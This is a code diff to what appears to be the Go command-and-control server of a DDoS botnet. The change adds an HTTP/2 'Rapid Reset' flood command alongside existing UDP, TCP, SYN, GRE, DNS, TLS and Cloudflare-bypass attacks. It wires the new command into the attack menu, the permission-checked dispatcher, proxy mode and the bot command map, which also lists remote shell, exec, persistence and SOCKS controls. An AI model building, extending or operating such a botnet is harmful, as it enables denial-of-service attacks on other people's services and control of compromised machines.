@@ -175,6 +175,7 @@ func (c *client) showAttackMenu(conn net.Conn) {
 	conn.Write([]byte("\033[1;97m║    !https     <url> <port> <time> - HTTPS/TLS flood          ║\r\n"))
 	conn.Write([]byte("\033[1;97m║    !tls       <url> <port> <time> - TLS flood (alias)        ║\r\n"))
 	conn.Write([]byte("\033[1;97m║    !cfbypass  <url> <port> <time> - Cloudflare bypass        ║\r\n"))
+	conn.Write([]byte("\033[1;97m║    !rapidreset<url> <port> <time> - HTTP/2 Rapid Reset       ║\r\n"))
 	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
 	conn.Write([]byte("\033[1;97m║  \033[1;36mControl\033[1;97m                                                    ║\r\n"))
 	conn.Write([]byte("\033[1;97m║    !stop                          - Stop all attacks         ║\r\n"))
@@ -332,7 +333,7 @@ func handleRequest(conn net.Conn) {
 				command := parts[0]
 				switch strings.ToLower(command) {
 
-				case "!udpflood", "!tcpflood", "!http", "!https", "!tls", "!cfbypass", "!syn", "!ack", "!gre", "!dns":
+				case "!udpflood", "!tcpflood", "!http", "!https", "!tls", "!cfbypass", "!rapidreset", "!syn", "!ack", "!gre", "!dns":
 					if !c.canUseDDoS() {
 						conn.Write([]byte("\033[1;31m❌ Permission denied: DDoS commands require at least Basic level\r\n\033[0m"))
 						continue
@@ -353,7 +354,7 @@ func handleRequest(conn net.Conn) {
 					proxyURL := ""
 					if len(parts) >= 6 && parts[4] == "-p" {
 						// Proxy mode only for L7 methods
-						if method == "!http" || method == "!https" || method == "!tls" || method == "!cfbypass" {
+						if method == "!http" || method == "!https" || method == "!tls" || method == "!cfbypass" || method == "!rapidreset" {
 							proxyMode = true
 							proxyURL = parts[5]
 							conn.Write([]byte(fmt.Sprintf("\033[38;5;208m⚡ Proxy URL:\033[0m %s\r\n", proxyURL)))
@@ -636,7 +637,7 @@ func handleRequest(conn net.Conn) {
 						// Check if this looks like a bot ID (not a known command)
 						knownCommands := map[string]bool{
 							"udpflood": true, "tcpflood": true, "http": true, "syn": true,
-							"ack": true, "gre": true, "dns": true, "shell": true, "exec": true,
+							"ack": true, "gre": true, "dns": true, "rapidreset": true, "shell": true, "exec": true,
 							"detach": true, "bg": true, "persist": true, "kill": true,
 							"reinstall": true, "lolnogtfo": true, "socks": true, "stopsocks": true,
 							"info": true, "stream": true,
